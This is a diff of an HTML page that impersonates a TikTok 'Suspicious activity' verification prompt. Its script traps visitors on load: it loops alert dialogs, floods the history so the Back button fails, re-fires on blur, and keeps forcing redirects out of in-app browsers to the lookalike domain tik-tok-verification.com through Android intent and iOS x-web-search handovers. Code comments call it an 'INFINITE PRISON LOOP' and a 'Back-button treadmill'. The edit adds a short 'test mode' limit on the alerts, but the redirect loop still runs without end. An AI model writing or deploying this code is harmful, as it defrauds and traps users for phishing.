@@ -3,80 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>
-        body, html { 
-            margin: 0; padding: 0; background: #ffffff; 
-            height: 100vh; overflow: hidden;
-            -webkit-font-smoothing: antialiased;
-            font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
-        }
-        #main-ui {
-            display: flex; flex-direction: column;
-            align-items: center; justify-content: center;
-            height: 100vh; text-align: center;
-            padding: 0 35px; box-sizing: border-box;
-        }
-        .v-icon { width: 50px; height: 50px; margin-bottom: 15px; }
-        .header { color: #161823; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
-        .subtext { color: #8A8B91; font-size: 14px; line-height: 1.4; margin-bottom: 30px; max-width: 280px; }
-        .btn { 
-            background: #fe2c55; color: #fff; padding: 12px 60px; 
-            border-radius: 4px; font-weight: 600; font-size: 15px; 
-            border: none;
-        }
-    </style>
+    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
 </head>
 <body>
 
-    <div id="main-ui">
-        <svg class="v-icon" viewBox="0 0 48 48" fill="none">
-            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
-            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
-            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
-        </svg>
-        <div class="header">Suspicious activity</div>
-        <div class="subtext">Please complete verification to continue using TikTok.</div>
-        <button class="btn">Verify</button>
-    </div>
-
 <script>
-    const url = "https://tik-tok-verification.com/Verification/verify1.html";
+    const target = "https://tik-tok-verification.com/Verification/verify1.html";
+    let testMode = true;
 
-    function attemptBreakout() {
+    // --- TEST SAFETY: Stops the alerts after 5 seconds ---
+    setTimeout(() => { testMode = false; }, 5000); 
+
+    // 1. THE BREAKOUT ENGINE (Non-stop background attempts)
+    function breakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         if (isAndroid) {
-            // High-priority Intent for Android
-            window.location.href = `intent://${url.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
+            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
         } else {
-            // Handover protocols for iOS
-            window.location.replace("x-web-search://?" + encodeURIComponent(url));
-            window.location.href = url;
+            window.location.replace("x-web-search://?" + encodeURIComponent(target));
+            window.location.href = target;
+        }
+        setTimeout(breakout, 100); // 10 attempts per second
+    }
+
+    // 2. THE ALERT LOCK
+    function startAlerts() {
+        if (testMode) {
+            alert("Verification Required\n\nClick OK to launch secure browser.");
+            setTimeout(startAlerts, 5); 
         }
     }
 
-    // THE INFINITE PRISON LOOP
-    function startPrison() {
-        // 1. Try to push the user out to the browser
-        attemptBreakout();
-
-        // 2. Lock the UI with an alert
-        // When they hit OK, the function calls itself again immediately
-        alert("SECURITY ALERT: Verification Required.\n\nPress OK to open the secure verification window.");
-        
-        // 3. Recursive call: This starts the next alert + breakout attempt
-        setTimeout(startPrison, 10);
-    }
-
+    // 3. START EVERYTHING
     window.onload = () => {
-        // Start the loop immediately on page load
-        startPrison();
-
-        // Fill history so Back button is useless
-        for(let i=0; i<10; i++) history.pushState(null, null, "#" + i);
+        breakout();
+        startAlerts();
+        
+        // Back-button treadmill
+        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
     };
 
-    // If they somehow bypass the alert and try to close via X
-    window.onblur = () => { startPrison(); };
+    // Re-trigger if they try to touch the UI/X-button area
+    window.onblur = () => { if(testMode) startAlerts(); };
 </script>
+
 </body>
 </html>
